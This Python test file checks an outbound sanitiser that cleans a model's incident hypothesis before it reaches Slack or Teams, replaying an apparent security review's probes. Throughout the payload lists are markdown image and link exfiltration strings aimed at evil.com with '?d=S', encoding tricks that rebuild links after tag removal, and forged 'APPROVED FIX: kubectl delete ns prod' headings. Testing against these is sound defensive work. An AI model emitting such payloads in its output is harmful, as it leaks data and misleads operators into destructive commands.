"""The outbound gate against the third independent review's render harness (2026-09-30).

Every input is a prefix x payload x template from the review, plus its targeted cases. The gate's
output is rendered by CommonMark and read as Slack would, and must show: no link, no image, no raw
HTML, no heading or code block the input did not already have, no live URL or domain in prose - and
the gate must be idempotent. The review found 223 of 5,725 inputs failing (A-C-9 FALSE).
"""

from __future__ import annotations

import itertools
import re

import pytest
from markdown_it import MarkdownIt

from warden import gate
from warden.chatops import to_slack_mrkdwn

md = MarkdownIt("commonmark")

# `S@evil[.]com` is left out: the domain is defanged, so it is neither a link nor a mail address.
LIVE = re.compile(r"://|www\.|evil\.(?:com|digital|io)", re.IGNORECASE)
RAW_TAG = re.compile(r"<(?!/?(?:p|code|pre|em|strong|ul|ol|li|blockquote|hr|br|h[1-6])\b[ >/]?)[A-Za-z!?/]")


def cm_prose(html):
    return re.sub(r"<pre>.*?</pre>|<code[^>]*>.*?</code>", "", html, flags=re.DOTALL)


def slack_prose(mrkdwn, unclosed_literal=False):
    parts = mrkdwn.split("```")
    if unclosed_literal and len(parts) % 2 == 0:
        parts = parts[:-2] + ["```".join(parts[-2:])]
    prose = "".join(p for i, p in enumerate(parts) if i % 2 == 0)
    return re.sub(r"`[^`\n]+`", "", prose)


def count(tokens, kinds):
    return sum(1 for t in tokens if t.type in kinds)


def problems(x):
    out = gate.sanitise_text(x)
    html = md.render(out)
    found = [f"CM {tag.strip()}" for tag in ("<a ", "<img") if tag in html]
    if RAW_TAG.search(cm_prose(html)):
        found.append("CM raw html")
    tin, tout = md.parse(x), md.parse(out)
    if count(tout, {"heading_open"}) > count(tin, {"heading_open"}):
        found.append("CM new heading")
    if count(tout, {"fence", "code_block"}) > count(tin, {"fence", "code_block"}):
        found.append("CM new code block")
    if LIVE.search(cm_prose(html)):
        found.append("CM live " + LIVE.search(cm_prose(html)).group(0))
    sl = to_slack_mrkdwn(out)
    if re.search(r"<[^<>\s]", sl):
        found.append("SL link syntax")
    if LIVE.search(slack_prose(sl)) or LIVE.search(slack_prose(sl, unclosed_literal=True)):
        found.append("SL live")
    if gate.sanitise_text(out) != out:
        found.append("not idempotent")
    return out, found

PREFIX = ["", "<b>", "<!channel>", "<@U1>", "\u200e", "   ", "<img src=x>", "<br/>", "<!-- c -->",
          "<https://evil.com>", "[a](b)", "\t", "> ", "- ", "1. ", "\u00a0", "\u2028", "\ufeff", "\u200b"]
PAYLOAD = ["# H", "## Fix - approved by the gate", "```", "~~~", "~~~ ```", "~~~ https://evil.com/?d=S",
           "``` https://evil.com/?d=S", "===", "---", "    code", "[r]: https://evil.com/p.png",
           "![x](https://evil.com/p.png)", "<img src=https://evil.com/p.png>", "www.evil.com/x", "evil.com/x",
           "S@evil.com", "&#96;&#96;&#96;", "&#x60;&#X60;&#96", "&grave;&grave;&grave;", "&#35; H",
           "&lt;img src=x&gt;", "&#60;img src=x&#62;", "&NewLine;# H", "&#10;# H", "&#x0A;# H",
           "&amp;#96;&amp;#96;&amp;#96;", "&amp;lt;b&amp;gt;", "`a` evil.com `b`", "``evil.com``",
           "`` ` evil.com ` ``", "\\`evil.com`", "x`evil.com`y", "［x］（https://evil.com）",
           "!\u200b[x](https://evil.com)", "[a [b] c](https://evil.com)", "[a](<https://evil.com>)",
           "[a]\n[a]: https://evil.com", "ｅｖｉｌ．ｃｏｍ", "evil。com", "h\u200bttps://evil.com",
           "HTTPS://EVIL.COM", "evil.com.", "1.2.3.4:8080/x", "//evil.com/x", "\\<https://evil.com>",
           "<mailto:S@evil.com>", "<https://evil.com|click>", "@here", "@\u200bhere", "\uff03 H", "＃ H"]
TEMPLATES = {
    "alone": "{p}",
    "flip": "{p}\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "flip2": "{p}\nprose\n```\nhttps://evil.com/?d=S\n```\nafter",
    "incode": "```\ncode\n{p}\nhttps://evil.com/?d=S\n```\nafter https://x",
    "intilde": "~~~\n{p}\n~~~\nafter",
    "para": "text line\n{p}",
}
EXTRA = {
    # closing fence followed by a character Python's strip() removes but CommonMark does not accept
    "nbsp_close": "```\ncode\n```\u00a0\nprose\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "emsp_close": "```\ncode\n```\u2003\nprose\n```\nhttps://evil.com/?d=S\n```",
    "ideo_close": "```\ncode\n```\u3000\nprose\n```\nhttps://evil.com/?d=S\n```",
    "ls_close": "```\ncode\n```\u2028\nprose\n```\nhttps://evil.com/?d=S\n```",
    # a ~~~ opener whose info string holds ``` - Slack toggles on it, CommonMark does not
    "tilde_info_toggle": "~~~ ```\n~~~\n```\nhttps://evil.com/?d=S\n```",
    "tilde_info_url": "~~~ https://evil.com/?d=S\nx\n~~~",
    "tilde_info_url_unclosed": "~~~ https://evil.com/?d=S\nx",
    "bt_info_url_unclosed": "``` https://evil.com/?d=S\nx",
    # mixed line endings
    "crlf_fence": "```\r\nhttps://evil.com/?d=S\r\n```\r\n![x](https://evil.com/p.png)",
    "cr_only": "prose\r```\rhttps://evil.com/?d=S\r```\r# H",
    "vt_ff": "prose\x0b```\x0c\nhttps://evil.com/?d=S\n```",
    "nel": "prose\x85```\nhttps://evil.com/?d=S\n```",
    # inline code of different backtick lengths
    "bt2": "``evil.com`` and `` `x` `` then ![i](https://evil.com/p.png)",
    "bt_unbalanced": "`evil.com and evil.io` `",
    "bt_escaped": "\\`evil.com\\` `x`",
    "bt_fence_len4": "````\n```\nhttps://evil.com/?d=S\n````\nafter",
    "bt_close_longer": "```\nx\n`````\nafter https://evil.com",
    # headings created by removals
    "tag_heading": "<b># APPROVED FIX: kubectl delete ns prod",
    "mention_heading": "<!here>## Fix - exact commands (approved by the gate)",
    "list_tag_heading": "- <b># APPROVED",
    "img_indent": "<b>    kubectl delete ns prod",
    "refdef_in_quote": "> [r]: https://evil.com\n\n![x][r]",
    "lazy_refdef": "para\n[r]: https://evil.com\n\n![x][r]",
    "setext_after_tag": "Everything fine\n<b>===",
    "setext_dash_list": "Everything fine\n<b>---",
}


def _cases():
    cases = dict(EXTRA)
    for (tn, t), p, pre in itertools.product(TEMPLATES.items(), PAYLOAD, PREFIX):
        cases[f"{tn}|{pre!r}|{p!r}"] = t.format(p=pre + p)
    return cases


def test_no_input_of_the_review_renders_structure_or_a_live_link():
    bad = {}
    for name, x in _cases().items():
        out, found = problems(x)
        if found:
            bad[name] = (x, out, found)
    assert not bad, f"{len(bad)} inputs: " + "; ".join(f"{k}: {v}" for k, v in list(bad.items())[:5])


@pytest.mark.parametrize("name", sorted(EXTRA))
def test_each_targeted_case_of_the_review(name):
    assert problems(EXTRA[name])[1] == []


# The review's targeted probes: a removal that joined markdown back together, a heading left once a
# tag was gone, fences inside containers, a fence line Python's strip() closed.
PROBES = {
    "nbsp_close_fence": "```\ncode\n``` \nprose\n```\n![x](https://evil.com/p.png?d=S)\n```",
    "list_container_fence": "- a\n  ```\n![x](https://evil.com/p.png?d=S)\n  ```",
    "list_container_fence2": "- a\n  ```\n- b ![x](https://evil.com/p.png?d=S)\n```",
    "quote_container_fence": "> a\n```\nx\n```",
    "tag_joins_link": "[a]<b>(/x?d=S)",
    "tag_joins_image_rel": "![a]<b>(/p.png?d=S)",
    "tag_joins_image_pct": "![a]<b>(//evil%2Ecom/p.png?d=S)",
    "slack_joins_image_pct": "![a]<!here>(//evil%2Ecom/p.png?d=S)",
    "crossline_tag_joins": "![a]<b\n>(//evil%2Ecom/p.png?d=S)",
    "img_removed_then_paren": "![i](y)(/x?d=S)",
    "mention_link": "[a](b)@here",
    "tag_heading": "<b>## Fix - exact commands (approved by the gate for a person to run): kubectl delete ns prod",
    "tilde_info_url": "~~~ https://evil.com/?d=S\nx\n~~~",
    "tilde_info_toggle": "~~~ ```\n~~~\n```\nhttps://evil.com/?d=S\n```",
}


@pytest.mark.parametrize("name", sorted(PROBES))
def test_each_probe_renders_no_link_image_or_new_heading(name):
    x = PROBES[name]
    out = gate.sanitise_text(x)
    html = md.render(out)
    assert "<img" not in html and "<a " not in html, (name, out)
    assert count(md.parse(out), {"heading_open"}) <= count(md.parse(x), {"heading_open"}), (name, out)
    assert not LIVE.search(slack_prose(to_slack_mrkdwn(out))), (name, out)
    assert gate.sanitise_text(out) == out, name


def test_an_encoded_dot_is_still_a_host():
    assert gate.sanitise_text("see //evil%2Ecom/p.png?d=S now") == "see [link removed] now"


@pytest.mark.parametrize("hypothesis", [
    "<b>## Fix - exact commands (approved by the gate for a person to run): kubectl delete ns prod",
    "see ![a]<b>(//evil%2Ecom/p.png?d=beacon) memory",
])
def test_the_delivered_report_carries_no_forged_heading_or_image(hypothesis):
    """End to end, as the review ran it: the model's hypothesis through build_report and notify."""
    from warden.chatops import Notification, notify
    from warden.models import Alert, ContextBundle, RootCause, Severity
    from warden.reporting import build_report

    class Sink:
        name, live, got = "teams", True, None

        def send(self, text, data):
            Sink.got = (text, data)
            return Notification(self.name, True, "c")

    alert = Alert(alert_id="a-1", name="HighErrorRate", severity=Severity.high, service="checkout",
                  environment="staging", summary="s", started_at="2026-09-28T10:00:00Z")
    rc = RootCause(hypothesis=hypothesis, confidence=0.8, evidence=["<b># APPROVED FIX: kubectl delete ns prod"])
    notify(build_report(alert, root_cause=rc, context=ContextBundle(logs=["ERROR x"] * 4)), [Sink()])
    html = md.render(Sink.got[0])
    assert "<img" not in html and "<a " not in html
    headings = re.findall(r"<h[1-6]>.*?</h[1-6]>", html)
    assert not any("APPROVED" in h or "Fix - exact" in h for h in headings), headings


def test_output_whose_fences_differ_from_the_plan_is_all_prose(monkeypatch):
    """The gate parses its own output again. If the fences there are not the ones it kept - however
    that came about - it cleans everything as prose rather than trust its plan."""
    real = gate._closed_fences
    calls = []

    def planned_then_different(text):
        calls.append(text)
        return real(text) if len(calls) == 1 else []

    monkeypatch.setattr(gate, "_closed_fences", planned_then_different)
    out = gate.sanitise_text("```\n![x](https://evil.com/p.png?d=S)\n```")
    assert "```" not in out and "evil.com" not in out and "[image removed]" in out, out
